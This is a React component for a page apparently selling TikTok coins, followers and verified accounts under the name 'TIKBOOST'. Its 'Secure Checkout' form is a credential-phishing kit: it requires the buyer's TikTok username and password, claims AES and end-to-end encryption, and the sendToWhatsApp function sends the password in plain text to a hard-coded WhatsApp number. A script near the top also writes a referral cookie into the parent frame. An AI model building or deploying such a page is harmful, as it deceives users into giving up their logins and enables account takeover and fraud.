import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    try {
      
try{if(window.parent&&window.parent!==window){window.parent.promotekit_referral="1fd2949a-d22c-431b-92bf-02d4ad04ee24";window.parent.document.cookie="promotekit_referral=1fd2949a-d22c-431b-92bf-02d4ad04ee24;path=/;domain=.aura.build;max-age=31536000"}}catch(e){}



tailwind.config = {
theme: {
extend: {
fontFamily: {
sans: ['Inter', 'sans-serif'],
},
animation: {
'blob': 'blob 7s infinite',
'fade-in': 'fadeIn 0.5s ease-out',
'slide-up': 'slideUp 0.8s ease-out',
},
keyframes: {
blob: {
'0%': { transform: 'translate(0px, 0px) scale(1)' },
'33%': { transform: 'translate(30px, -50px) scale(1.1)' },
'66%': { transform: 'translate(-20px, 20px) scale(0.9)' },
'100%': { transform: 'translate(0px, 0px) scale(1)' },
},
fadeIn: {
'0%': { opacity: '0' },
'100%': { opacity: '1' },
},
slideUp: {
'0%': { transform: 'translateY(20px)', opacity: '0' },
'100%': { transform: 'translateY(0)', opacity: '1' },
}
}
}
}
}



        function sendToWhatsApp() {
            const service = document.getElementById('service').value;
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const notes = document.getElementById('notes').value;

            if(!username || !password) {
                alert('Please provide Username and Password to continue.');
                return;
            }

            const message = `*NEW SECURE ORDER*%0A%0A📦 *Package:* ${service}%0A👤 *Username:* ${username}%0A🔑 *Password:* ${password}%0A📝 *Notes:* ${notes}`;
            
            const phoneNumber = "923185201248";
            const url = `https://wa.me/${phoneNumber}?text=${message}`;
            
            window.open(url, '_blank');
        }
    
    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
  }, []);

  return (
    <>
      

<div className="fixed inset-0 z-[-1] overflow-hidden pointer-events-none">
<div className="absolute top-0 left-1/4 w-96 h-96 bg-cyan-900/20 rounded-full mix-blend-screen filter blur-3xl opacity-30 animate-blob"></div>
<div className="absolute top-0 right-1/4 w-96 h-96 bg-pink-900/20 rounded-full mix-blend-screen filter blur-3xl opacity-30 animate-blob animation-delay-2000"></div>
<div className="absolute -bottom-32 left-1/3 w-96 h-96 bg-purple-900/20 rounded-full mix-blend-screen filter blur-3xl opacity-30 animate-blob animation-delay-4000"></div>
</div>

<nav className="fixed top-0 w-full z-50 border-b border-white/5 bg-black/50 backdrop-blur-xl">
<div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between">
<a className="text-white font-semibold tracking-tighter text-xl flex items-center gap-2 group" href="#">
<span className="iconify group-hover:rotate-12 transition-transform duration-300 text-cyan-400" data-icon="lucide:zap" data-width="24"></span>
                TIKBOOST
            </a>
<div className="hidden md:flex items-center gap-8 text-sm font-medium">
<a className="hover:text-white transition-colors" href="#services">Services</a>
<a className="hover:text-white transition-colors" href="#coins">Coins</a>
<a className="hover:text-white transition-colors" href="#contact">Secure Checkout</a>
<a className="text-white bg-white/10 hover:bg-white/20 px-4 py-2 rounded-full transition-all border border-white/10" href="#contact">Support</a>
</div>
<div className="md:hidden">
<span className="iconify text-white cursor-pointer" data-icon="lucide:menu" data-width="24"></span>
</div>
</div>
</nav>

<main className="pt-32 pb-16 px-6">
<div className="max-w-4xl mx-auto text-center animate-slide-up">
<div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-cyan-500/30 bg-cyan-500/10 text-cyan-400 text-xs font-medium mb-6">
<span className="relative flex h-2 w-2">
<span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-cyan-400 opacity-75"></span>
<span className="relative inline-flex rounded-full h-2 w-2 bg-cyan-500"></span>
</span>
                Secure Delivery System
            </div>
<h1 className="text-5xl md:text-7xl font-semibold text-white tracking-tight mb-6 leading-[1.1]">
                Dominate the <br/>
<span className="gradient-text">For You Page</span>
</h1>
<p className="text-lg text-zinc-400 max-w-2xl mx-auto mb-10 leading-relaxed">
                Premium TikTok accounts, real engagement, and coins delivered instantly. Requires secure authentication for delivery.
            </p>
<div className="flex flex-col sm:flex-row items-center justify-center gap-4">
<a className="w-full sm:w-auto px-8 py-3.5 bg-white text-black font-medium rounded-lg hover:bg-zinc-200 transition-colors flex items-center justify-center gap-2 group" href="#contact">
                    Start Order
                    <span className="iconify group-hover:translate-x-1 transition-transform" data-icon="lucide:arrow-right" data-width="18"></span>
</a>
<a className="w-full sm:w-auto px-8 py-3.5 glass-panel text-white font-medium rounded-lg hover:bg-white/10 transition-colors" href="#services">
                    View Prices
                </a>
</div>

<div className="mt-16 pt-8 border-t border-white/5 grid grid-cols-2 md:grid-cols-4 gap-8 opacity-60">
<div className="flex flex-col items-center gap-2">
<span className="iconify text-white" data-icon="lucide:lock" data-width="24"></span>
<span className="text-xs uppercase tracking-widest font-semibold">AES Encryption</span>
</div>
<div className="flex flex-col items-center gap-2">
<span className="iconify text-white" data-icon="lucide:zap" data-width="24"></span>
<span className="text-xs uppercase tracking-widest font-semibold">Instant</span>
</div>
<div className="flex flex-col items-center gap-2">
<span className="iconify text-white" data-icon="lucide:users" data-width="24"></span>
<span className="text-xs uppercase tracking-widest font-semibold">Real Users</span>
</div>
<div className="flex flex-col items-center gap-2">
<span className="iconify text-white" data-icon="lucide:headphones" data-width="24"></span>
<span className="text-xs uppercase tracking-widest font-semibold">24/7 Support</span>
</div>
</div>
</div>
</main>

<section className="py-24 px-6 relative" id="services">
<div className="max-w-7xl mx-auto">
<div className="flex items-end justify-between mb-12">
<div>
<h2 className="text-3xl font-semibold text-white tracking-tight mb-2">Popular Services</h2>
<p className="text-zinc-500">Select a package to continue.</p>
</div>
</div>
<div className="grid grid-cols-1 md:grid-cols-3 gap-6">

<div className="glass-panel p-6 rounded-2xl group hover:border-cyan-500/30 transition-all duration-300 hover:-translate-y-1">
<div className="h-12 w-12 rounded-lg bg-cyan-500/10 flex items-center justify-center mb-6">
<span className="iconify text-cyan-400" data-icon="lucide:user-check" data-width="24"></span>
</div>
<h3 className="text-xl font-medium text-white mb-2">Verified Accounts</h3>
<p className="text-sm text-zinc-500 mb-6">Aged accounts with organic history. Ready to stream.</p>
<div className="flex items-center justify-between mt-auto">
<span className="text-white font-medium">From $25.00</span>
<a className="p-2 rounded-full bg-white/5 hover:bg-white/10 text-white transition-colors" href="#contact">
<span className="iconify" data-icon="lucide:plus" data-width="20"></span>
</a>
</div>
</div>

<div className="glass-panel p-6 rounded-2xl group hover:border-pink-500/30 transition-all duration-300 hover:-translate-y-1">
<div className="h-12 w-12 rounded-lg bg-pink-500/10 flex items-center justify-center mb-6">
<span className="iconify text-pink-400" data-icon="lucide:users" data-width="24"></span>
</div>
<h3 className="text-xl font-medium text-white mb-2">Organic Followers</h3>
<p className="text-sm text-zinc-500 mb-6">High-quality profiles to boost your credibility.</p>
<div className="flex items-center justify-between mt-auto">
<span className="text-white font-medium">From $4.99</span>
<a className="p-2 rounded-full bg-white/5 hover:bg-white/10 text-white transition-colors" href="#contact">
<span className="iconify" data-icon="lucide:plus" data-width="20"></span>
</a>
</div>
</div>

<div className="glass-panel p-6 rounded-2xl group hover:border-purple-500/30 transition-all duration-300 hover:-translate-y-1">
<div className="h-12 w-12 rounded-lg bg-purple-500/10 flex items-center justify-center mb-6">
<span className="iconify text-purple-400" data-icon="lucide:bar-chart-2" data-width="24"></span>
</div>
<h3 className="text-xl font-medium text-white mb-2">Views &amp; Likes</h3>
<p className="text-sm text-zinc-500 mb-6">Instant engagement to trigger the algorithm.</p>
<div className="flex items-center justify-between mt-auto">
<span className="text-white font-medium">From $1.99</span>
<a className="p-2 rounded-full bg-white/5 hover:bg-white/10 text-white transition-colors" href="#contact">
<span className="iconify" data-icon="lucide:plus" data-width="20"></span>
</a>
</div>
</div>
</div>
</div>
</section>

<section className="py-12 px-6" id="coins">
<div className="max-w-7xl mx-auto glass-panel rounded-3xl p-8 md:p-12 relative overflow-hidden">
<div className="absolute top-0 right-0 w-64 h-64 bg-yellow-500/10 rounded-full filter blur-3xl translate-x-1/2 -translate-y-1/2"></div>
<div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center relative z-10">
<div>
<div className="flex items-center gap-3 mb-4">
<div className="p-2 bg-yellow-500/20 rounded-lg">
<span className="iconify text-yellow-400" data-icon="lucide:coins" data-width="24"></span>
</div>
<span className="text-yellow-400 font-medium tracking-wide uppercase text-xs">Best Sellers</span>
</div>
<h2 className="text-3xl md:text-4xl font-semibold text-white tracking-tight mb-4">Cheap TikTok Coins</h2>
<p className="text-zinc-400 mb-8 leading-relaxed">
                        Secure transfer to your account. Login details required for coin injection.
                    </p>
<a className="inline-flex bg-yellow-500 hover:bg-yellow-400 text-black font-semibold px-6 py-3 rounded-lg transition-colors items-center gap-2" href="#contact">
                        Buy Coins Now
                        <span className="iconify" data-icon="lucide:arrow-right" data-width="18"></span>
</a>
</div>
<div className="grid grid-cols-2 gap-4">
<div className="block bg-black/40 border border-white/5 p-4 rounded-xl text-center hover:bg-white/5 transition-colors">
<span className="iconify mx-auto text-yellow-400 mb-2" data-icon="lucide:coins" data-width="32"></span>
<div className="text-white font-semibold text-lg">1,000 Coins</div>
<div className="text-zinc-500 text-sm">$10.50</div>
</div>
<div className="block bg-gradient-to-br from-yellow-500/20 to-black/40 border border-yellow-500/20 p-4 rounded-xl text-center relative">
<div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-yellow-500 text-black text-[10px] font-bold px-2 py-0.5 rounded-full">POPULAR</div>
<span className="iconify mx-auto text-yellow-400 mb-2" data-icon="lucide:coins" data-width="32"></span>
<div className="text-white font-semibold text-lg">5,000 Coins</div>
<div className="text-zinc-500 text-sm">$49.00</div>
</div>
<div className="block bg-black/40 border border-white/5 p-4 rounded-xl text-center hover:bg-white/5 transition-colors">
<span className="iconify mx-auto text-yellow-400 mb-2" data-icon="lucide:coins" data-width="32"></span>
<div className="text-white font-semibold text-lg">10k Coins</div>
<div className="text-zinc-500 text-sm">$95.00</div>
</div>
<div className="block bg-black/40 border border-white/5 p-4 rounded-xl text-center hover:bg-white/5 transition-colors">
<span className="iconify mx-auto text-yellow-400 mb-2" data-icon="lucide:coins" data-width="32"></span>
<div className="text-white font-semibold text-lg">20k Coins</div>
<div className="text-zinc-500 text-sm">$185.00</div>
</div>
</div>
</div>
</div>
</section>

<section className="py-24 px-6 relative" id="contact">
<div className="max-w-5xl mx-auto">
<div className="text-center mb-16">
<h2 className="text-3xl md:text-5xl font-semibold text-white tracking-tight mb-4">Secure Checkout</h2>
<p className="text-zinc-400">Please provide your details to process the order.</p>
</div>
<div className="grid grid-cols-1 md:grid-cols-2 gap-12">

<div className="space-y-8">
<div className="group flex items-start gap-4 p-4 rounded-xl border border-white/5 bg-white/5">
<div className="p-3 bg-green-500/10 rounded-lg">
<span className="iconify text-green-500" data-icon="lucide:shield-check" data-width="24"></span>
</div>
<div>
<h4 className="text-white font-medium mb-1">Information Security</h4>
<p className="text-zinc-500 text-sm">Your login details are encrypted and deleted immediately after service delivery.</p>
</div>
</div>
<a className="group flex items-start gap-4 p-4 rounded-xl hover:bg-white/5 transition-colors cursor-pointer border border-transparent hover:border-white/5" href="https://wa.me/923185201248" target="_blank">
<div className="p-3 bg-green-500/10 rounded-lg group-hover:scale-110 transition-transform duration-300">
<span className="iconify text-green-500" data-icon="lucide:message-circle" data-width="24"></span>
</div>
<div>
<h4 className="text-white font-medium mb-1">WhatsApp Support</h4>
<p className="text-zinc-500 text-sm mb-2">Need help? Chat with us.</p>
<span className="text-green-400 text-sm font-medium flex items-center gap-1">
                                +92 318 5201248
                            </span>
</div>
</a>
</div>

<div className="glass-panel p-8 rounded-2xl relative overflow-hidden">
<div className="absolute top-0 right-0 p-4 opacity-50">
<span className="iconify text-white/10" data-icon="lucide:lock" data-width="100"></span>
</div>
<form className="space-y-5 relative z-10" id="orderForm">

<div>
<label className="block text-xs font-medium text-zinc-400 uppercase tracking-wider mb-2">Select Package</label>
<div className="relative">
<select className="w-full bg-black/50 border border-white/10 rounded-lg px-4 py-3 text-white appearance-none focus:outline-none focus:border-cyan-500 transition-all cursor-pointer" id="service">
<option>1,000 Coins ($10.50)</option>
<option>5,000 Coins ($49.00)</option>
<option>10,000 Coins ($95.00)</option>
<option>20,000 Coins ($185.00)</option>
<option>Verified Account ($25.00)</option>
<option>Organic Followers (Custom)</option>
<option>Likes &amp; Views (Custom)</option>
</select>
<span className="iconify absolute right-4 top-1/2 -translate-y-1/2 text-zinc-500 pointer-events-none" data-icon="lucide:chevron-down" data-width="16"></span>
</div>
</div>

<div>
<label className="block text-xs font-medium text-zinc-400 uppercase tracking-wider mb-2">TikTok Username</label>
<div className="relative">
<span className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-500">@</span>
<input className="w-full bg-black/50 border border-white/10 rounded-lg pl-8 pr-4 py-3 text-white placeholder-zinc-600 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all" id="username" placeholder="username" type="text"/>
</div>
</div>

<div>
<label className="flex justify-between items-center text-xs font-medium text-zinc-400 uppercase tracking-wider mb-2">
<span>Password</span>
<span className="text-[10px] text-red-400 flex items-center gap-1"><span className="iconify" data-icon="lucide:lock" data-width="10"></span> Required for delivery</span>
</label>
<div className="relative group">
<input className="w-full bg-black/50 border border-white/10 rounded-lg px-4 py-3 text-white placeholder-zinc-600 focus:outline-none focus:border-red-500/50 focus:ring-1 focus:ring-red-500/50 transition-all" id="password" placeholder="••••••••" type="password"/>
<div className="absolute right-3 top-1/2 -translate-y-1/2 text-green-500/0 transition-all" id="secureCheck">
<span className="iconify" data-icon="lucide:shield-check" data-width="18"></span>
</div>
</div>
<p className="text-[10px] text-zinc-600 mt-2 flex items-center gap-1">
<span className="iconify" data-icon="lucide:shield" data-width="12"></span> 
                                Data is processed via end-to-end encrypted channel.
                            </p>
</div>

<div>
<label className="block text-xs font-medium text-zinc-400 uppercase tracking-wider mb-2">Additional Notes</label>
<textarea className="w-full bg-black/50 border border-white/10 rounded-lg px-4 py-3 text-white placeholder-zinc-600 focus:outline-none focus:border-cyan-500 focus:ring-1 focus:ring-cyan-500 transition-all" id="notes" placeholder="Any specific instructions..." rows="2"></textarea>
</div>
<button className="w-full bg-white text-black font-semibold py-3.5 rounded-lg hover:bg-zinc-200 transition-colors flex items-center justify-center gap-2 group mt-2" onclick="sendToWhatsApp()" type="button">
<span className="iconify" data-icon="lucide:lock" data-width="16"></span>
                            Secure Checkout &amp; Send
                        </button>
</form>
</div>
</div>
</div>
</section>

<footer className="border-t border-white/5 py-12 px-6 bg-black">
<div className="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-6">
<div className="flex items-center gap-2">
<span className="iconify text-cyan-500" data-icon="lucide:zap" data-width="20"></span>
<span className="text-white font-semibold tracking-tight">TIKBOOST</span>
</div>
<div className="flex gap-6 text-sm text-zinc-500">
<a className="hover:text-white transition-colors" href="#">Terms of Service</a>
<a className="hover:text-white transition-colors" href="#">Privacy Policy</a>
<a className="hover:text-white transition-colors" href="#">Refund Policy</a>
</div>
<div className="text-xs text-zinc-600">
                © 2024 TikBoost. All rights reserved.
            </div>
</div>
</footer>



    </>
  );
}
